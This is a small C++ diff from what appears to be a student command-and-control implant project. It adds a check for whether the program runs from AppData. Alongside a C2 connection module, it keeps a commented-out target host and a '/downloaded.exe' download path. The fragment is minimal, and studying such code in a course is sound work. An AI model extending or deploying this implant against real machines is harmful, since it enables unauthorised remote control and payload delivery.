@@ -6,6 +6,7 @@
 #include "CP.h"
 #include "RM.h"
 #include "DB.h"
+#include "UTIL.h";
 #include <iostream>
 
 
@@ -16,7 +17,8 @@ int main()
 	C2 connModule;// ("www.uvu-cybersecurity.com", "/downloaded.exe");
 	RM remvModule;
 	DB debgModule;
-	
+	UTIL util;
+	util.isExecutingFromAppData();
 	connModule.setPathName("/");
 	connModule.setHostName("www.google.com");
 
